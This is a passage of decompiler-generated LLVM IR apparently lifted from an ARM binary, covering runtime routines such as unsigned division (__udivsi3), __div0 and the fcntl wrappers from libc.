  store i8 %v2_10dc0, i8* %v3_10dc8, align 1
  %v4_10dc8 = load i32, i32* %r0.global-to-local, align 4
  %v5_10dc8 = add i32 %v4_10dc8, 1
  store i32 %v5_10dc8, i32* %r0.global-to-local, align 4
  br i1 %v3_10dc4, label %dec_label_pc_10dd0, label %dec_label_pc_10dbc.dec_label_pc_10dbc_crit_edge

dec_label_pc_10dbc.dec_label_pc_10dbc_crit_edge:  ; preds = %dec_label_pc_10dbc
  %v0_10dbc.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10dc0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10dbc

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10dbc, %.thread1, %entry
  %v0_10dd0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10dd0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10dd0

dec_label_pc_10de0:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10d94, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10db8

; uselistorder directives
  uselistorder i32 %v5_10dc8, { 1, 0 }
  uselistorder i1 %v3_10dc4, { 1, 0 }
  uselistorder i32 %v0_10dc0, { 1, 0 }
  uselistorder i32 %v1_10da8, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10d94, { 1, 0 }
  uselistorder i32 %v2_10d94, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10d90.pre, { 1, 0 }
  uselistorder i32 %v1_10d74, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10d6c, { 1, 0 }
  uselistorder i32 %v3_10d50, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10cf0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 6, 7, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10db8, { 1, 0 }
  uselistorder label %dec_label_pc_10da8, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_10d14, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10de8 = load i32, i32* @r1, align 4
  %v1_10de8 = add i32 %v0_10de8, -1
  store i32 %v1_10de8, i32* %r2.global-to-local, align 4
  %v2_10de8 = icmp eq i32 %v0_10de8, 0
  %v7_10de8 = icmp eq i32 %v0_10de8, 1
  %v0_10dec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_10de8, i32 %v0_10dec)
  br i1 %v2_10de8, label %dec_label_pc_10ed0, label %dec_label_pc_10df4

dec_label_pc_10df4:                               ; preds = %entry
  %v0_10df4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10df4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_10df4, %v1_10df4
  br i1 %tmp, label %dec_label_pc_10dfc, label %dec_label_pc_10e88

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10df4
  %v1_10dfc = load i32, i32* %r2.global-to-local, align 4
  %v2_10dfc = and i32 %v1_10dfc, %v1_10df4
  %v4_10dfc = icmp eq i32 %v2_10dfc, 0
  br i1 %v4_10dfc, label %dec_label_pc_10e94, label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10dfc
  %v3_10e04 = icmp ult i32 %v1_10df4, 536870912
  br i1 %v3_10e04, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10e04
  %v4_10e08 = mul i32 %v1_10df4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10e04, %.thread
  %v0_10e28.pr36.ph = phi i32 [ %v4_10e08, %.thread ], [ %v1_10df4, %dec_label_pc_10e04 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10e04 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_10e28.pr36 = phi i32 [ %v4_10e1c, %bb81 ], [ %v0_10e28.pr36.ph, %.preheader.preheader ]
  %v1_10e20 = phi i32 [ %v4_10e20, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_10e14 = icmp ugt i32 %v0_10e28.pr36, 268435455
  br i1 %v2_10e14, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_10e28thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_10e18 = icmp ult i32 %v0_10e28.pr36, %v0_10df4
  br i1 %v4_10e18, label %bb80, label %dec_label_pc_10e28thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_10e1c = and i32 %v0_10e28.pr36, 268435456
  %v3_10e1c = icmp eq i32 %v2_10e1c, 0
  %v4_10e1c = mul i32 %v0_10e28.pr36, 16
  br i1 %v3_10e1c, label %bb81, label %dec_label_pc_10e28.loopexit

bb81:                                             ; preds = %bb80
  %v2_10e20 = and i32 %v1_10e20, 268435456
  %v3_10e20 = icmp eq i32 %v2_10e20, 0
  %v4_10e20 = mul i32 %v1_10e20, 16
  br i1 %v3_10e20, label %.preheader, label %dec_label_pc_10e28thread-pre-split.loopexit.loopexit

dec_label_pc_10e28thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_10e3448.ph = phi i32 [ %v1_10e20, %bb ], [ %v4_10e20, %bb81 ]
  %v0_10e28.pr38.ph = phi i32 [ %v0_10e28.pr36, %bb ], [ %v4_10e1c, %bb81 ]
  br label %dec_label_pc_10e28thread-pre-split.loopexit

dec_label_pc_10e28thread-pre-split.loopexit:      ; preds = %dec_label_pc_10e28thread-pre-split.loopexit.loopexit, %.thread2
  %v1_10e3448 = phi i32 [ %v1_10e20, %.thread2 ], [ %v1_10e3448.ph, %dec_label_pc_10e28thread-pre-split.loopexit.loopexit ]
  %v0_10e28.pr38 = phi i32 [ %v0_10e28.pr36, %.thread2 ], [ %v0_10e28.pr38.ph, %dec_label_pc_10e28thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10e28thread-pre-split

dec_label_pc_10e28thread-pre-split:               ; preds = %dec_label_pc_10e28thread-pre-split.loopexit, %bb83
  %v1_10e3446 = phi i32 [ %v1_10e3448, %dec_label_pc_10e28thread-pre-split.loopexit ], [ %v3_10e34, %bb83 ]
  %v0_10e28.pr = phi i32 [ %v0_10e28.pr38, %dec_label_pc_10e28thread-pre-split.loopexit ], [ %v3_10e30, %bb83 ]
  br label %dec_label_pc_10e28

dec_label_pc_10e28.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_10e28

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e28.loopexit, %dec_label_pc_10e28thread-pre-split
  %v1_10e34 = phi i32 [ %v1_10e3446, %dec_label_pc_10e28thread-pre-split ], [ %v1_10e20, %dec_label_pc_10e28.loopexit ]
  %v1_10e30 = phi i32 [ %v0_10e28.pr, %dec_label_pc_10e28thread-pre-split ], [ %v4_10e1c, %dec_label_pc_10e28.loopexit ]
  %v2_10e28 = icmp slt i32 %v1_10e30, 0
  br i1 %v2_10e28, label %dec_label_pc_10e3c, label %bb82

bb82:                                             ; preds = %dec_label_pc_10e28
  %v4_10e2c = icmp ult i32 %v1_10e30, %v0_10df4
  br i1 %v4_10e2c, label %bb83, label %dec_label_pc_10e3c

bb83:                                             ; preds = %bb82
  %v3_10e30 = mul i32 %v1_10e30, 2
  %v2_10e34 = icmp slt i32 %v1_10e34, 0
  %v3_10e34 = mul i32 %v1_10e34, 2
  br i1 %v2_10e34, label %dec_label_pc_10e3c, label %dec_label_pc_10e28thread-pre-split

dec_label_pc_10e3c:                               ; preds = %bb82, %dec_label_pc_10e28, %bb83
  %v2_10e4859 = phi i32 [ %v3_10e34, %bb83 ], [ %v1_10e34, %bb82 ], [ %v1_10e34, %dec_label_pc_10e28 ]
  %v1_10e4051 = phi i32 [ %v3_10e30, %bb83 ], [ %v1_10e30, %bb82 ], [ %v1_10e30, %dec_label_pc_10e28 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %.thread11, %dec_label_pc_10e3c
  %v1_10e74 = phi i32 [ %v4_10e74, %.thread11 ], [ %v2_10e4859, %dec_label_pc_10e3c ]
  %v1_10e48 = phi i32 [ %v0_10e80, %.thread11 ], [ 0, %dec_label_pc_10e3c ]
  %v1_10e78 = phi i32 [ %v4_10e78, %.thread11 ], [ %v1_10e4051, %dec_label_pc_10e3c ]
  %v1_10e44 = phi i32 [ %v0_10e70, %.thread11 ], [ %v0_10df4, %dec_label_pc_10e3c ]
  %v3_10e40 = icmp ult i32 %v1_10e44, %v1_10e78
  br i1 %v3_10e40, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10e40
  %v3_10e44 = sub i32 %v1_10e44, %v1_10e78
  store i32 %v3_10e44, i32* %r0.global-to-local, align 4
  %v3_10e48 = or i32 %v1_10e48, %v1_10e74
  store i32 %v3_10e48, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10e40, %bb84
  %v1_10e50 = phi i32 [ %v1_10e44, %dec_label_pc_10e40 ], [ %v3_10e44, %bb84 ]
  %v1_10e54 = phi i32 [ %v1_10e48, %dec_label_pc_10e40 ], [ %v3_10e48, %bb84 ]
  %v4_10e4c = udiv i32 %v1_10e78, 2
  %v6_10e4c = icmp ult i32 %v1_10e50, %v4_10e4c
  br i1 %v6_10e4c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10e50 = urem i32 %v1_10e78, 2
  %v4_10e50 = icmp eq i32 %v3_10e50, 0
  %v6_10e50 = sub i32 %v1_10e50, %v4_10e4c
  store i32 %v6_10e50, i32* %r0.global-to-local, align 4
  br i1 %v4_10e50, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10e54 = udiv i32 %v1_10e74, 2
  %v6_10e54 = or i32 %v1_10e54, %v5_10e54
  store i32 %v6_10e54, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10e5c = phi i32 [ %v6_10e50, %bb85 ], [ %v1_10e50, %.thread7 ], [ %v6_10e50, %bb86 ]
  %v1_10e60 = phi i32 [ %v1_10e54, %bb85 ], [ %v1_10e54, %.thread7 ], [ %v6_10e54, %bb86 ]
  %v4_10e58 = udiv i32 %v1_10e78, 4
  %v6_10e58 = icmp ult i32 %v1_10e5c, %v4_10e58
  br i1 %v6_10e58, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10e5c = and i32 %v1_10e78, 2
  %v4_10e5c = icmp eq i32 %v3_10e5c, 0
  %v6_10e5c = sub i32 %v1_10e5c, %v4_10e58
  store i32 %v6_10e5c, i32* %r0.global-to-local, align 4
  br i1 %v4_10e5c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10e60 = udiv i32 %v1_10e74, 4
  %v6_10e60 = or i32 %v1_10e60, %v5_10e60
  store i32 %v6_10e60, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_10e68 = phi i32 [ %v6_10e5c, %bb87 ], [ %v1_10e5c, %.thread8 ], [ %v6_10e5c, %bb88 ]
  %v1_10e6c = phi i32 [ %v1_10e60, %bb87 ], [ %v1_10e60, %.thread8 ], [ %v6_10e60, %bb88 ]
  %v4_10e64 = udiv i32 %v1_10e78, 8
  %v6_10e64 = icmp ult i32 %v1_10e68, %v4_10e64
  br i1 %v6_10e64, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_10e68 = and i32 %v1_10e78, 4
  %v4_10e68 = icmp eq i32 %v3_10e68, 0
  %v6_10e68 = sub i32 %v1_10e68, %v4_10e64
  store i32 %v6_10e68, i32* %r0.global-to-local, align 4
  br i1 %v4_10e68, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10e6c = udiv i32 %v1_10e74, 8
  %v6_10e6c = or i32 %v1_10e6c, %v5_10e6c
  store i32 %v6_10e6c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10e80 = phi i32 [ %v1_10e6c, %bb89 ], [ %v1_10e6c, %.thread9 ], [ %v6_10e6c, %bb90 ]
  %v0_10e70 = phi i32 [ %v6_10e68, %bb89 ], [ %v1_10e68, %.thread9 ], [ %v6_10e68, %bb90 ]
  %v2_10e70 = icmp eq i32 %v0_10e70, 0
  br i1 %v2_10e70, label %dec_label_pc_10e80, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10e74, 16
  br i1 %tmp138, label %dec_label_pc_10e80, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10e74 = udiv i32 %v1_10e74, 16
  %v4_10e78 = udiv i32 %v1_10e78, 16
  br label %dec_label_pc_10e40

dec_label_pc_10e80:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_10e80, i32* %r0.global-to-local, align 4
  ret i32 %v0_10e80

dec_label_pc_10e88:                               ; preds = %dec_label_pc_10df4
  %v9_10df4 = icmp eq i32 %v0_10df4, %v1_10df4
  %. = zext i1 %v9_10df4 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10dfc
  %v2_10e94 = icmp ugt i32 %v1_10df4, 65535
  br i1 %v2_10e94, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10e94
  %v2_10e98 = and i32 %v1_10df4, 32768
  %v3_10e98 = icmp eq i32 %v2_10e98, 0
  %v4_10e98 = udiv i32 %v1_10df4, 65536
  br i1 %v3_10e98, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10e94
  %v0_10ea465 = phi i32 [ %v1_10df4, %dec_label_pc_10e94 ], [ %v4_10e98, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10ea8 = phi i32 [ %v0_10ea465, %.thread16 ], [ %v4_10e98, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10ea4 = icmp ugt i32 %v1_10ea8, 255
  br i1 %v2_10ea4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10ea8 = and i32 %v1_10ea8, 128
  %v3_10ea8 = icmp eq i32 %v2_10ea8, 0
  %v4_10ea8 = udiv i32 %v1_10ea8, 256
  br i1 %v3_10ea8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10eac = or i32 %storemerge, 8
  store i32 %v2_10eac, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10eb8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10eac, %bb98 ]
  %v1_10eb4 = phi i32 [ %v1_10ea8, %bb96 ], [ %v4_10ea8, %bb97 ], [ %v4_10ea8, %bb98 ]
  %v2_10eb0 = icmp ugt i32 %v1_10eb4, 15
  br i1 %v2_10eb0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10eb4 = and i32 %v1_10eb4, 8
  %v3_10eb4 = icmp eq i32 %v2_10eb4, 0
  %v4_10eb4 = udiv i32 %v1_10eb4, 16
  br i1 %v3_10eb4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10eb8 = add nsw i32 %v1_10eb8, 4
  store i32 %v2_10eb8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10ec0 = phi i32 [ %v1_10eb8, %.thread17 ], [ %v1_10eb8, %bb99 ], [ %v2_10eb8, %bb100 ]
  %v5_10ec4 = phi i32 [ %v1_10eb4, %.thread17 ], [ %v4_10eb4, %bb99 ], [ %v4_10eb4, %bb100 ]
  %v2_10ebc = icmp ugt i32 %v5_10ec4, 3
  %v7_10ebc = icmp eq i32 %v5_10ec4, 4
  %v2_10ec0 = xor i1 %v7_10ebc, true
  %v3_10ec0 = and i1 %v2_10ebc, %v2_10ec0
  br i1 %v3_10ec0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10ec0 = add nsw i32 %v4_10ec0, 3
  store i32 %v5_10ec0, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10ec4 = phi i32 [ %v4_10ec0, %.thread18 ], [ %v5_10ec0, %bb101 ]
  %v2_10ec4 = xor i1 %v2_10ebc, true
  %v3_10ec4 = or i1 %v7_10ebc, %v2_10ec4
  br i1 %v3_10ec4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10ec4 = udiv i32 %v5_10ec4, 2
  %v9_10ec4 = add i32 %v4_10ec4, %v8_10ec4
  store i32 %v9_10ec4, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10ec8 = phi i32 [ %v4_10ec4, %bb102 ], [ %v9_10ec4, %bb103 ]
  %v6_10ec8 = lshr i32 %v0_10df4, %v1_10ec8
  store i32 %v6_10ec8, i32* %r0.global-to-local, align 4
  ret i32 %v6_10ec8

dec_label_pc_10ed0:                               ; preds = %entry
  %v0_10ed4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10ec4, { 1, 0 }
  uselistorder i1 %v7_10ebc, { 1, 0 }
  uselistorder i32 %v4_10eb4, { 1, 0 }
  uselistorder i32 %v1_10eb4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10eac, { 1, 0 }
  uselistorder i32 %v4_10ea8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10e98, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10e70, { 1, 0 }
  uselistorder i32 %v0_10e80, { 1, 0, 2 }
  uselistorder i32 %v4_10e64, { 1, 0 }
  uselistorder i32 %v1_10e6c, { 1, 2, 0 }
  uselistorder i32 %v4_10e58, { 1, 0 }
  uselistorder i32 %v1_10e60, { 1, 2, 0 }
  uselistorder i32 %v4_10e4c, { 1, 0 }
  uselistorder i32 %v1_10e54, { 1, 2, 0 }
  uselistorder i32 %v1_10e78, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_10e48, { 1, 0 }
  uselistorder i32 %v1_10e74, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10e34, { 1, 0 }
  uselistorder i32 %v3_10e30, { 1, 0 }
  uselistorder i32 %v1_10e30, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10e34, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10e20, { 1, 0 }
  uselistorder i32 %v4_10e1c, { 2, 1, 0 }
  uselistorder i32 %v1_10e20, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10e28.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_10df4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_10df4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10de8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 52, 2, 28, 53, 27, 54, 25, 55, 26, 56, 57, 10, 58, 3, 59, 60, 32, 61, 31, 62, 29, 63, 30, 64, 12, 11, 65, 66, 33, 67, 34, 68, 14, 13, 69, 70, 35, 71, 36, 72, 15, 16, 4, 5, 23, 22, 38, 73, 37, 74, 17, 18, 6, 39, 75, 40, 76, 77, 78, 19, 79, 80, 7, 41, 81, 42, 82, 43, 83, 84, 85, 20, 86, 87, 8, 46, 88, 44, 89, 45, 90, 91, 21, 92, 24, 47, 93, 48, 94, 49, 95, 96, 97, 50, 98, 99, 100, 101, 51, 102, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10e80, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10e3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e28thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10ee8 = udiv i32 %arg1, %arg2
  ret i32 %v2_10ee8
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_10f04 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_10f04
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_10f20 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_10f20, 2
  br i1 %tmp, label %dec_label_pc_10f5c, label %dec_label_pc_10f38

dec_label_pc_10f38:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_10f90, label %dec_label_pc_10f4c

dec_label_pc_10f4c:                               ; preds = %dec_label_pc_10f38
  %v0_10f50 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10f84

dec_label_pc_10f5c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_10f78, label %dec_label_pc_10f90

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10f5c
  %v0_10f7c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10f84

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10f4c, %dec_label_pc_10f78
  %storemerge2 = phi i32 [ %v0_10f50, %dec_label_pc_10f4c ], [ %v0_10f7c, %dec_label_pc_10f78 ]
  %storemerge.in = load i16, i16* @global_var_22068.345, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_10f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_10f84 = sub i32 0, %v0_10f84
  store i32 %v1_10f84, i32* %r2.global-to-local, align 4
  %v3_10f88 = add i32 %storemerge, %storemerge2
  %v4_10f88 = inttoptr i32 %v3_10f88 to i32*
  store i32 %v1_10f84, i32* %v4_10f88, align 4
  br label %dec_label_pc_10f90

dec_label_pc_10f90:                               ; preds = %dec_label_pc_10f38, %dec_label_pc_10f5c, %dec_label_pc_10f84
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10f84 ], [ %arg1, %dec_label_pc_10f5c ], [ %arg1, %dec_label_pc_10f38 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_10f90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f84, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10fa8 = load i32, i32* @r2, align 4
  %v9_10fa8 = load i32, i32* @r3, align 4
  store i32 %v9_10fa8, i32* %stack_var_-4, align 4
  %v3_10fac = load i32, i32* @r4, align 4
  store i32 %v3_10fac, i32* %stack_var_-32, align 4
  %v6_10fac = load i32, i32* @r5, align 4
  %v12_10fac = load i32, i32* @r7, align 4
  %v4_10fbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 12776) to i32*), align 4
  %v2_10fc4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10fc4, i32* @r3, align 4
  %v2_10fc8 = icmp eq i32 %v4_10fbc, 0
  %v0_10fd0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10fd0, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_10fa8, i32* @r4, align 4
  br i1 %v2_10fc8, label %dec_label_pc_10fec, label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %entry
  %v7_10fe0 = icmp eq i32 %arg2, 7
  br i1 %v7_10fe0, label %dec_label_pc_1102c, label %bb

bb:                                               ; preds = %dec_label_pc_10fe0
  %v8_10fe4 = icmp eq i32 %arg2, 14
  br i1 %v8_10fe4, label %dec_label_pc_1102c, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_10fd0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10fd0, -4095
  br i1 %tmp, label %dec_label_pc_11024, label %dec_label_pc_1100c

dec_label_pc_1100c:                               ; preds = %dec_label_pc_10fec
  %v0_11010 = call i32 @__aeabi_read_tp()
  %v3_11014 = load i16, i16* @global_var_22068.345, align 2
  %v4_11014 = sext i16 %v3_11014 to i32
  store i32 %v4_11014, i32* @r3, align 4
  %v0_11018 = load i32, i32* @r2, align 4
  %v1_11018 = sub i32 0, %v0_11018
  store i32 %v1_11018, i32* @r2, align 4
  %v3_1101c = add i32 %v4_11014, %v0_11010
  %v4_1101c = inttoptr i32 %v3_1101c to i32*
  store i32 %v1_11018, i32* %v4_1101c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11024

dec_label_pc_11024:                               ; preds = %dec_label_pc_10fec, %dec_label_pc_1100c
  %v0_11024 = phi i32 [ %v0_10fd0, %dec_label_pc_10fec ], [ -1, %dec_label_pc_1100c ]
  br label %dec_label_pc_11078

dec_label_pc_1102c:                               ; preds = %dec_label_pc_10fe0, %bb
  %v0_1102c = call i32 @__libc_enable_asynccancel()
  %v0_11030 = load i32, i32* @r7, align 4
  store i32 %v0_11030, i32* @r1, align 4
  store i32 %v0_1102c, i32* %r6.global-to-local, align 4
  %v0_1103c = load i32, i32* @r5, align 4
  store i32 %v0_1103c, i32* %r0.global-to-local, align 4
  store i32 %v0_1103c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_1103c, -4095
  br i1 %tmp15, label %dec_label_pc_1106c, label %dec_label_pc_11054

dec_label_pc_11054:                               ; preds = %dec_label_pc_1102c
  %v1_11058 = sub i32 0, %v0_1103c
  %v0_1105c = call i32 @__aeabi_read_tp()
  store i32 %v0_1105c, i32* %r0.global-to-local, align 4
  %v3_11060 = load i16, i16* @global_var_22068.345, align 2
  %v4_11060 = sext i16 %v3_11060 to i32
  store i32 %v4_11060, i32* @r3, align 4
  %v3_11064 = add i32 %v4_11060, %v0_1105c
  %v4_11064 = inttoptr i32 %v3_11064 to i32*
  store i32 %v1_11058, i32* %v4_11064, align 4
  store i32 -1, i32* @r2, align 4
  %v0_1106c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_1102c, %dec_label_pc_11054
  %v0_11070 = phi i32 [ %v0_1103c, %dec_label_pc_1102c ], [ -1, %dec_label_pc_11054 ]
  %v0_1106c = phi i32 [ %v0_1102c, %dec_label_pc_1102c ], [ %v0_1106c.pre, %dec_label_pc_11054 ]
  store i32 %v0_1106c, i32* %r0.global-to-local, align 4
  store i32 %v0_11070, i32* @r7, align 4
  %v1_11074 = call i32 @__libc_disable_asynccancel(i32 %v0_1106c)
  store i32 %v1_11074, i32* %r0.global-to-local, align 4
  %v0_11078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11078

dec_label_pc_11078:                               ; preds = %dec_label_pc_11024, %dec_label_pc_1106c
  %v0_11078 = phi i32 [ %v0_11024, %dec_label_pc_11024 ], [ %v0_11078.pre, %dec_label_pc_1106c ]
  store i32 %v0_11078, i32* %r0.global-to-local, align 4
  %v2_11080 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11080, i32* @r4, align 4
  store i32 %v6_10fac, i32* @r5, align 4
  store i32 %v12_10fac, i32* @r7, align 4
  ret i32 %v0_11078

; uselistorder directives
  uselistorder i32 %v0_11078, { 1, 0 }
  uselistorder i32 %v0_1106c, { 1, 0 }
